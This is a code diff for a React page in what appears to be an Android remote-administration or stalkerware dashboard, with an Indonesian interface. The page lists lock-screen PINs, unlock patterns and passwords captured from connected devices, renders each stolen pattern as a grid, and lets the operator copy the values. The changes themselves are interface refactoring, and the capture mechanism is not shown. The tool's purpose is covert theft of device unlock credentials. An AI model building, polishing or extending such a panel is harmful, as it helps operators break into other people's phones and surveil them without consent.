@@ -2,16 +2,12 @@
 
 import { useState, useEffect, useCallback } from 'react'
 import Sidebar from '@/components/Sidebar'
+import { useDevice } from '@/contexts/DeviceContext'
 import {
   ShieldAlert, RefreshCw, Trash2, Copy, Check,
-  Hash, Grid3x3, Type, HelpCircle, Signal,
+  Hash, Grid3x3, KeyRound, HelpCircle, WifiOff,
+  Lock, ListFilter,
 } from 'lucide-react'
-
-interface DeviceItem {
-  deviceId: string
-  deviceName: string
-  connected: boolean
-}
 
 interface PinCapture {
   id: number
@@ -27,33 +23,33 @@ const TYPE_CONFIG: Record<string, {
   borderColor: string
   icon: React.ReactNode
 }> = {
-  pin:      {
+  pin: {
     label: 'PIN',
     textColor: 'text-yellow-400',
     bgColor: 'bg-yellow-400/10',
     borderColor: 'border-yellow-400/30',
-    icon: <Hash size={12} />,
+    icon: <Hash size={13} />,
   },
-  pattern:  {
+  pattern: {
     label: 'Pola',
     textColor: 'text-purple-400',
     bgColor: 'bg-purple-400/10',
     borderColor: 'border-purple-400/30',
-    icon: <Grid3x3 size={12} />,
+    icon: <Grid3x3 size={13} />,
   },
   password: {
     label: 'Sandi',
     textColor: 'text-android-blue',
     bgColor: 'bg-android-blue/10',
     borderColor: 'border-android-blue/30',
-    icon: <Type size={12} />,
+    icon: <KeyRound size={13} />,
   },
-  unknown:  {
+  unknown: {
     label: 'Lainnya',
     textColor: 'text-android-muted',
     bgColor: 'bg-android-muted/10',
     borderColor: 'border-android-border',
-    icon: <HelpCircle size={12} />,
+    icon: <HelpCircle size={13} />,
   },
 }
 
@@ -66,26 +62,26 @@ function PatternDots({ value }: { value: string }) {
     4: [0, 1], 5: [1, 1], 6: [2, 1],
     7: [0, 2], 8: [1, 2], 9: [2, 2],
   }
-  const size = 54
+  const size = 60
 
   return (
-    <svg width={size} height={size} viewBox="0 0 54 54" className="shrink-0">
-      {[1,2,3,4,5,6,7,8,9].map(n => {
-        const [cx, cy] = positions[n].map(v => 9 + v * 18)
-        const isUsed = nodes.includes(n)
-        return (
-          <circle key={n} cx={cx} cy={cy} r={isUsed ? 4 : 3}
-            fill={isUsed ? '#c084fc' : '#334155'}
-            opacity={isUsed ? 1 : 0.5}
-          />
-        )
-      })}
+    <svg width={size} height={size} viewBox="0 0 60 60" className="shrink-0">
       {nodes.slice(1).map((n, i) => {
-        const [x1, y1] = positions[nodes[i]].map(v => 9 + v * 18)
-        const [x2, y2] = positions[n].map(v => 9 + v * 18)
+        const [x1, y1] = positions[nodes[i]].map(v => 10 + v * 20)
+        const [x2, y2] = positions[n].map(v => 10 + v * 20)
         return (
           <line key={i} x1={x1} y1={y1} x2={x2} y2={y2}
-            stroke="#c084fc" strokeWidth="1.5" strokeOpacity="0.6" />
+            stroke="#c084fc" strokeWidth="2" strokeOpacity="0.5" strokeLinecap="round" />
+        )
+      })}
+      {[1, 2, 3, 4, 5, 6, 7, 8, 9].map(n => {
+        const [cx, cy] = positions[n].map(v => 10 + v * 20)
+        const isUsed = nodes.includes(n)
+        return (
+          <circle key={n} cx={cx} cy={cy} r={isUsed ? 5 : 3.5}
+            fill={isUsed ? '#c084fc' : '#334155'}
+            opacity={isUsed ? 1 : 0.4}
+          />
         )
       })}
     </svg>
@@ -93,25 +89,11 @@ function PatternDots({ value }: { value: string }) {
 }
 
 export default function PinLogPage() {
-  const [deviceId,    setDeviceId]    = useState<string | null>(null)
-  const [devices,     setDevices]     = useState<DeviceItem[]>([])
-  const [captures,    setCaptures]    = useState<PinCapture[]>([])
-  const [loading,     setLoading]     = useState(false)
-  const [copied,      setCopied]      = useState<number | null>(null)
-  const [filter,      setFilter]      = useState<string>('all')
-
-  const fetchDevices = useCallback(async () => {
-    try {
-      const res  = await fetch('/api/devices')
-      const data = await res.json()
-      const list: DeviceItem[] = data.devices ?? []
-      setDevices(list)
-      if (!deviceId && list.length > 0) {
-        const online = list.find(d => d.connected) ?? list[0]
-        setDeviceId(online.deviceId)
-      }
-    } catch {}
-  }, [deviceId])
+  const { devices, selectedId: deviceId, setSelectedId: setDeviceId, connected } = useDevice()
+  const [captures, setCaptures]   = useState<PinCapture[]>([])
+  const [loading, setLoading]     = useState(false)
+  const [copied, setCopied]       = useState<number | null>(null)
+  const [filter, setFilter]       = useState<string>('all')
 
   const fetchCaptures = useCallback(async () => {
     if (!deviceId) return
@@ -124,12 +106,6 @@ export default function PinLogPage() {
       setLoading(false)
     }
   }, [deviceId])
-
-  useEffect(() => {
-    fetchDevices()
-    const t = setInterval(fetchDevices, 5000)
-    return () => clearInterval(t)
-  }, [fetchDevices])
 
   useEffect(() => {
     if (!deviceId) return
@@ -151,7 +127,6 @@ export default function PinLogPage() {
   }
 
   const filtered  = filter === 'all' ? captures : captures.filter(c => c.lockType === filter)
-  const connected = devices.find(d => d.deviceId === deviceId)?.connected ?? false
 
   const fmt = (iso: string) =>
     new Date(iso).toLocaleString('id-ID', {
@@ -159,31 +134,30 @@ export default function PinLogPage() {
       hour: '2-digit', minute: '2-digit', second: '2-digit',
     })
 
-  const filterTabs = ['all', 'pin', 'pattern', 'password'] as const
-  const tabConfig = {
-    all:      { label: 'Semua',   icon: <ShieldAlert size={12} /> },
-    pin:      { label: 'PIN',     icon: <Hash size={12} /> },
-    pattern:  { label: 'Pola',    icon: <Grid3x3 size={12} /> },
-    password: { label: 'Sandi',   icon: <Type size={12} /> },
-  }
+  const filterTabs: { key: string; label: string; icon: React.ReactNode }[] = [
+    { key: 'all',      label: 'Semua',  icon: <ListFilter size={13} /> },
+    { key: 'pin',      label: 'PIN',    icon: <Hash size={13} /> },
+    { key: 'pattern',  label: 'Pola',   icon: <Grid3x3 size={13} /> },
+    { key: 'password', label: 'Sandi',  icon: <KeyRound size={13} /> },
+  ]
 
   return (
     <div className="flex min-h-screen">
       <Sidebar connected={connected} devices={devices} selectedId={deviceId} onSelect={setDeviceId} />
 
       <main className="flex-1 page-content overflow-y-auto">
-        <div className="max-w-2xl mx-auto px-4 py-4 md:py-6">
+        <div className="max-w-2xl mx-auto px-3 md:px-6 py-4 md:py-6">
 
           {/* Header */}
           <div className="flex items-center justify-between mb-4">
             <div className="flex items-center gap-2.5">
               <div className="p-2 rounded-xl bg-android-red/10">
-                <ShieldAlert size={18} className="text-android-red" />
+                <Lock size={18} className="text-android-red" />
               </div>
               <div>
                 <h2 className="text-base md:text-lg font-bold text-white leading-tight">PIN / Pola / Sandi</h2>
                 <p className="text-[11px] text-android-muted">
-                  {captures.length} entri · auto-refresh 3s
+                  {captures.length} entri tersimpan
                 </p>
               </div>
             </div>
@@ -192,12 +166,14 @@ export default function PinLogPage() {
                 onClick={fetchCaptures}
                 disabled={loading}
                 className="p-2 bg-android-surface border border-android-border rounded-lg text-android-muted hover:text-white transition-colors disabled:opacity-50"
+                title="Refresh"
               >
                 <RefreshCw size={14} className={loading ? 'animate-spin' : ''} />
               </button>
               <button
                 onClick={handleClear}
                 className="p-2 bg-android-surface border border-android-red/30 rounded-lg text-android-red hover:bg-android-red/10 transition-colors"
+                title="Hapus semua"
               >
                 <Trash2 size={14} />
               </button>
@@ -205,23 +181,25 @@ export default function PinLogPage() {
           </div>
 
           {/* Filter tabs */}
-          <div className="flex gap-1.5 mb-4 overflow-x-auto pb-1">
-            {filterTabs.map(t => {
-              const count = t === 'all' ? captures.length : captures.filter(c => c.lockType === t).length
-              const cfg   = tabConfig[t]
+          <div className="flex gap-1.5 mb-4 overflow-x-auto pb-1 scrollbar-none">
+            {filterTabs.map(({ key, label, icon }) => {
+              const count = key === 'all' ? captures.length : captures.filter(c => c.lockType === key).length
+              const active = filter === key
               return (
                 <button
-                  key={t}
-                  onClick={() => setFilter(t)}
+                  key={key}
+                  onClick={() => setFilter(key)}
                   className={`shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium border transition-colors ${
-                    filter === t
+                    active
                       ? 'bg-android-red/10 border-android-red/40 text-android-red'
                       : 'bg-android-surface border-android-border text-android-muted hover:text-white'
                   }`}
                 >
-                  {cfg.icon}
-                  {cfg.label}
-                  <span className={`text-[10px] px-1 rounded-full ${filter === t ? 'bg-android-red/20 text-android-red' : 'bg-android-border text-android-muted'}`}>
+                  {icon}
+                  <span>{label}</span>
+                  <span className={`text-[10px] px-1.5 py-0.5 rounded-full font-semibold ${
+                    active ? 'bg-android-red/20 text-android-red' : 'bg-android-border text-android-muted'
+                  }`}>
                     {count}
                   </span>
                 </button>
@@ -229,7 +207,7 @@ export default function PinLogPage() {
             })}
           </div>
 
-          {/* Setup notice */}
+          {/* Notices */}
           {connected && captures.length === 0 && !loading && (
             <div className="mb-4 p-3 bg-android-yellow/10 border border-android-yellow/30 rounded-xl flex items-start gap-2.5 text-xs text-android-yellow">
               <ShieldAlert size={14} className="shrink-0 mt-0.5" />
@@ -244,17 +222,17 @@ export default function PinLogPage() {
 
           {!connected && (
             <div className="mb-4 p-3 bg-android-surface border border-android-border rounded-xl flex items-center gap-2 text-xs text-android-muted">
-              <Signal size={13} />
+              <WifiOff size={13} className="shrink-0" />
               Hubungkan device untuk melihat data PIN/Pola.
             </div>
           )}
 
-          {/* Entry list */}
+          {/* List */}
           {loading && captures.length === 0 ? (
             <div className="text-center py-12 text-android-muted text-sm">Memuat…</div>
           ) : filtered.length === 0 ? (
             <div className="text-center py-12">
-              <ShieldAlert size={36} className="mx-auto text-android-muted/30 mb-3" />
+              <Lock size={36} className="mx-auto text-android-muted/20 mb-3" />
               <p className="text-android-muted text-sm">
                 {filter === 'all' ? 'Belum ada data tangkapan' : `Belum ada tangkapan tipe "${filter}"`}
               </p>
@@ -267,45 +245,53 @@ export default function PinLogPage() {
                 return (
                   <div
                     key={c.id}
-                    className="bg-android-surface border border-android-border rounded-xl p-3.5 flex items-center gap-3 group hover:border-android-muted/50 transition-colors"
+                    className="bg-android-surface border border-android-border rounded-xl p-3 md:p-4 hover:border-android-muted/40 transition-colors"
                   >
-                    {/* Type badge */}
-                    <div className={`shrink-0 flex items-center gap-1 px-2 py-1 rounded-lg text-[11px] font-bold border ${info.textColor} ${info.bgColor} ${info.borderColor}`}>
-                      {info.icon}
-                      {info.label}
-                    </div>
-
-                    {/* Value */}
-                    <div className="flex-1 min-w-0 flex items-center gap-3">
-                      {isPattern
-                        ? <PatternDots value={c.value} />
-                        : <span className="font-mono text-xl font-bold text-white tracking-widest truncate">{c.value}</span>
-                      }
-                      <div className="min-w-0">
-                        {isPattern && (
-                          <p className="font-mono text-xs text-android-muted truncate">{c.value}</p>
-                        )}
-                        <p className="text-[10px] text-android-muted">{fmt(c.capturedAt)}</p>
+                    {/* Top row: badge + time + copy */}
+                    <div className="flex items-center justify-between mb-2.5">
+                      <div className={`flex items-center gap-1.5 px-2 py-1 rounded-lg text-[11px] font-bold border ${info.textColor} ${info.bgColor} ${info.borderColor}`}>
+                        {info.icon}
+                        {info.label}
+                      </div>
+                      <div className="flex items-center gap-2">
+                        <span className="text-[10px] text-android-muted">{fmt(c.capturedAt)}</span>
+                        <button
+                          onClick={() => copyValue(c.id, c.value)}
+                          className={`p-1.5 rounded-lg border transition-colors ${
+                            copied === c.id
+                              ? 'bg-android-green/10 border-android-green/30 text-android-green'
+                              : 'bg-android-bg border-android-border text-android-muted hover:text-white'
+                          }`}
+                          title="Salin"
+                        >
+                          {copied === c.id ? <Check size={12} /> : <Copy size={12} />}
+                        </button>
                       </div>
                     </div>
 
-                    {/* Copy */}
-                    <button
-                      onClick={() => copyValue(c.id, c.value)}
-                      className="shrink-0 p-1.5 rounded-lg bg-android-bg border border-android-border text-android-muted hover:text-white transition-colors opacity-0 group-hover:opacity-100"
-                    >
-                      {copied === c.id ? <Check size={13} className="text-android-green" /> : <Copy size={13} />}
-                    </button>
+                    {/* Value row */}
+                    <div className="flex items-center gap-3">
+                      {isPattern && <PatternDots value={c.value} />}
+                      <div className="min-w-0 flex-1">
+                        {isPattern ? (
+                          <p className="font-mono text-xs text-android-muted break-all">{c.value}</p>
+                        ) : (
+                          <p className="font-mono text-lg md:text-2xl font-bold text-white tracking-widest break-all">
+                            {c.value}
+                          </p>
+                        )}
+                      </div>
+                    </div>
                   </div>
                 )
               })}
             </div>
           )}
 
-          {/* Footer stats */}
+          {/* Footer */}
           {filtered.length > 0 && (
-            <p className="text-center text-[11px] text-android-muted mt-4">
-              {filtered.length} dari {captures.length} entri ditampilkan
+            <p className="text-center text-[11px] text-android-muted mt-4 pb-2">
+              Menampilkan {filtered.length} dari {captures.length} entri
             </p>
           )}
 
